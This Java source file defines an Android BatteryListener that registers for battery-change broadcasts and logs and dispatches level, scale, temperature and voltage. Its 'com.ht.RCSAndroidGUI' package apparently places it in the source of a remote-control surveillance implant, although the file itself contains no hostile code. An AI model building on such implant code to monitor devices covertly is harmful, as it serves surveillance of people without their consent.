package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.Battery;
import com.ht.RCSAndroidGUI.Status;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.util.Log;

public class BatteryListener extends Listener<Battery> {
	/** The Constant TAG. */
	private static final String TAG = "BatteryListener";

	private BroadcastReceiver batteryReceiver;

	/** The singleton. */
	private volatile static BatteryListener singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static BatteryListener self() {
		if (singleton == null) {
			synchronized (BatteryListener.class) {
				if (singleton == null) {
					singleton = new BatteryListener();
				}
			}
		}

		return singleton;
	}
	
	@Override
	protected void start() {
		batteryReceiver = new BroadcastReceiver() {
			int scale = -1;
			int level = -1;
			int voltage = -1;
			int temp = -1;

			@Override
			public void onReceive(final Context context, final Intent intent) {
				level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
				scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
				temp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
				voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);

				Log.d("QZ", TAG + " BatteryManager level is " + level + "/" + scale + ", temp is " + temp
						+ ", voltage is " + voltage);

				// Call batteryMonitor() in Status ever time we have a change of
				// status
				dispatch(new Battery(level, scale, temp, voltage));
			}
		};

		final IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);

		// Register the broadcastreceiver and filter it to only get battery
		// status changes
		Status.getAppContext().registerReceiver(batteryReceiver, filter);

	}

	@Override
	protected void stop() {
		Status.getAppContext().unregisterReceiver(batteryReceiver);
	}
}
